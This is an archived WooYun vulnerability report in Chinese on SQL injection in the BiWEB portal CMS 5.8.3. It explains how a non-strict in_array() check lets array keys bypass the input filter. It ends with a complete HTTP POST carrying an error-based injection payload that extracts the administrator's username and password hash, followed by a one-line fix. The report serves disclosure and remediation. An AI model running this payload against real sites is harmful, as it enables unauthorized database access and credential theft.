{"id": 42887, "wybug_id": "wooyun-2014-084430", "wybug_title": "BiWEB最新门户版注入漏洞打包（证明in_array使用不当的危害）", "wybug_corp": "BiWEB", "wybug_author": "路人甲", "wybug_date": "2014-11-23 22:18", "wybug_open_date": "2015-02-21 22:20", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-23：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-21：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： BiWEB最新门户版注入漏洞打包（证明in_array使用不当的危害） 详细说明：  在wooyun上看到了有人把biweb的shell拿到了： WooYun: BIWEB门户版Getwebshell漏洞 ，也有人提了其他漏洞，我也来找找它的漏洞吧。去官网下BiWEB门户版最新的5.8.3来看看。BiWEB在全局过滤时in_array()使用不当，造成全局过滤可以绕过。先来看看BiWEB是怎么处理防注入的。首先BiWEB对用户输入进行了全局过滤，过滤的方法在/config/filtrate.inc.php中\n<?php//过滤GET或POST的值，去除两端空格和转义符号if ($_SERVER['REQUEST_METHOD'] == 'POST'){\tcheck::filtrateData($_POST,$arrGPdoDB['htmlspecialchars']);}elseif($_SERVER['REQUEST_METHOD'] == 'GET'){\tcheck::filtrateData($_GET,$arrGPdoDB['htmlspecialchars']);}?>\n然后我们去看看filtrateData(),在/web_common5.8/check.class.php中\nstatic function filtrateData(&$ParamValue,$arrHtml){\t\tif (is_array($ParamValue)){\t\t\tforeach ($ParamValue as $key=>$value){\t\t\t\tif(is_array($value)){\t\t\t\t\tcheck::filtrateData($value,$arrHtml);\t\t\t\t}else{\t\t\t\t\tif(v === 'v' || v === '' || strpos(p,v)) exit;\t\t\t\t\tif($key === 'v') {\t\t\t\t\t\techo v;exit;\t\t\t\t\t}\t\t\t\t\tif(count($arrHtml)){\t\t\t\t\t\tif(in_array($key,$arrHtml)) $ParamValue[$key] = trim($value);\t\t\t\t\t\telse $ParamValue[$key] = htmlspecialchars(trim($value), ENT_QUOTES);\t\t\t\t\t}else $ParamValue[$key] = htmlspecialchars(trim($value), ENT_QUOTES);\t\t\t\t}\t\t\t}\t\t}else{\t\t\t$ParamValue = trim($ParamValue);\t\t}\t}\n可以看到，filtrateData()中有这么一句：if(in_array($key,$arrHtml)) $ParamValue[$key] = trim($value)，其中$arrHtml为$arrGPdoDB['htmlspecialchars'] = array('intro','summary','tag')，也就是说当$key是'intro','summary','tag'中的之一时，就不进行htmlspecialchars编码，也就可以绕过全局过滤了。问题在这里，如果$key等于0时，in_array($key,$arrHtml)将返回ture，也就不进行编码！通过POST提交一个数组，而数组的key是0，1，2...，如通过POST提交一个名为test的数组，test[]=injection_code&test[]=2，这样就可以利用上面代码中in_array()使用不当造成的注入了。BiWEB这种漏洞有不少，这里列几个出来\n/ask/adminu/index.php/company/adminu/index.php/exhibition/adminu/index.php/job/adminu/index.php/links/adminu/index.php/news/adminu/index.php/product/adminu/index.php/trade/adminu/index.php/video/adminu/index.php\n这里以/job/adminu/index.php为例进行证明\n无关代码if(isset($_GET['action'])){\tif($_GET['action']=='search') {\t\t// 构造搜索条件和翻页参数\t\t$arrLink[] = 'action=search';\t\tif (!empty($_GET['title'])) {\t\t\t$strKeywords = strval(urldecode($_GET['title']));\t\t\tif($strKeywords[0] == '/'){\t\t\t\t//精确查询ID\t\t\t\t$strKeywords = substr($strKeywords,1);\t\t\t\tif(is_numeric($strKeywords)) $arrWhere[] = \"id = '\" . $strKeywords . \"'\";\t\t\t}else{\t\t\t\t$arrWhere[] = \"tag LIKE '%\" . $_GET['title'] . \"%'\";\t\t\t}\t\t\t$arrLink[] = 'title=' . $_GET['title'];\t\t}\t\tif ($_GET['pass'] == '1' || $_GET['pass'] == '0') {\t\t\t$arrWhere[] = \"pass='\".$_GET['pass'].\"'\";\t\t\t$arrLink[] = 'pass=' . $_GET['pass'];\t\t}\t\tif (!empty($_GET['type_id'])) {\t\t\t$intTypeID = intval($_GET['type_id']);\t\t\t$arrWhere[] = \"type_id='\".$intTypeID.\"' or type_roue_id like '%:$intTypeID:%'\";\t\t\t$arrLink[] = 'type_id='.$intTypeID;\t\t}\t} else {\t\t$objWebInit->doInfoAction($_GET['action'],$_POST['select']);\t}}无关代码\n当$_GET['action']为'moveup'时，则执行这条语句$objWebInit->doInfoAction($_GET['action'],$_POST['select'])，我们再去看看doInfoAction()， 在/web_common5.8/php_common.php中\nfunction doInfoAction($strAction=null,$arrData=null,$arrFile=array('photo')){\t\tswitch ($strAction){\t\t\tcase 'del':\t\t\t\tforeach ($arrData as $key=>$val){\t\t\t\t\t$this->deleteInfo($val,$arrFile);\t\t\t\t}\t\t\t\tbreak;\t\t\tcase 'delpic':\t\t\t\tforeach ($arrData as $key=>$val){\t\t\t\t\t$this->deleteInfoPic($val,$arrFile);\t\t\t\t}\t\t\t\tbreak;\t\t\tcase 'moveup':\t\t\t\tforeach ($arrData as $key=>$val){\t\t\t\t\t$this->moveupInfo($val);\t\t\t\t}\t\t\t\tbreak;\t\t\tcase 'check':\t\t\t\tforeach ($arrData as $key=>$val){\t\t\t\t\t$this->passInfo($val,1);\t\t\t\t}\t\t\t\tbreak;\t\t\tcase 'uncheck':\t\t\t\tforeach ($arrData as $key=>$val){\t\t\t\t\t$this->passInfo($val,0);\t\t\t\t}\t\t\t\tbreak;\t\t\tcase 'settop':\t\t\t\tforeach ($arrData as $key=>$val){\t\t\t\t\t$this->topInfo($val,1);\t\t\t\t}\t\t\t\tbreak;\t\t\tcase 'unsettop':\t\t\t\tforeach ($arrData as $key=>$val){\t\t\t\t\t$this->topInfo($val,0);\t\t\t\t}\t\t\t\tbreak;\t\t\tcase 'setrecommend':\t\t\t\tforeach ($arrData as $key=>$val){\t\t\t\t\t$this->recommendInfo($val,1);\t\t\t\t}\t\t\t\tbreak;\t\t\tcase 'unsetrecommend':\t\t\t\tforeach ($arrData as $key=>$val){\t\t\t\t\t$this->recommendInfo($val,0);\t\t\t\t}\t\t\t\tbreak;\t\t}\t\treturn true;\t}\n再去看看相同文件中的moveupInfo\nfunction moveupInfo($intInfoID){\t\t$arrData['submit_date'] = date('Y-m-d H:i:s');\t\t$strWhere = \" WHERE `id` = $intInfoID\";\t\treturn $this->updateDataG($this->tablename2,$arrData,$strWhere);\t}\n可以看到传入的值直接作为id带入了SQL语句，造成了注入。（这里只是拿这个例子来说明in_array()使用不当可以引入单引号，当然这个注入点可以直接用数字型的注入方法注入，可不使用单引号）单引号这样引入\n\n成功注入，Payload如下\nPOST /job/adminu/index.php?action=moveup HTTP/1.1Host: 192.168.0.107User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,zh-cn;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://192.168.0.107/job/adminu/index.phpCookie: AJSTAT_ok_times=8; bdshare_firstime=1414502402741; PHPSESSID=fd9mb9gjsot1f9hkrkjttsc954Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 213select%5B%5D= 1 or  (select 1 from (select count(*),concat(0x23,(select concat(user_name,0x23,password,0x23)from biweb_user limit 0,1),floor(rand(0)*2))x from  information_schema.tables group by x)a)&select%5B%5D=\n注入成功，管理员的用户名和密码\n\n   漏洞证明：  见 详细说明   修复方案：  in_array ($key,$array,true)   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}